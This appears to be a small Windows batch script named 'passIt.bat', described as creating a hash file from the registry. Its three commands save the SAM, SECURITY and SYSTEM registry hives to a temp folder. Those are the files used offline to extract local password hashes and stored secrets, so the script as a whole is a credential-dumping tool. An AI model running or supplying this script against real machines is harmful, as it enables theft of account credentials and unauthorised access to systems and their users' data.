::passIt.bat
::Create Hash File from registry
::
::Created by Spuzzelsnest
::
::Change Log
::-----------
::V1.0 Initial release 18-08-2016
::############################################

@echo off
reg.exe save HKLM\SAM c:\temp\Logs\sam.hiv
reg.exe save HKLM\SECURITY c:\temp\Logs\security.hiv
reg.exe save HKLM\SYSTEM c:\temp\Logs\system.hiv

::exit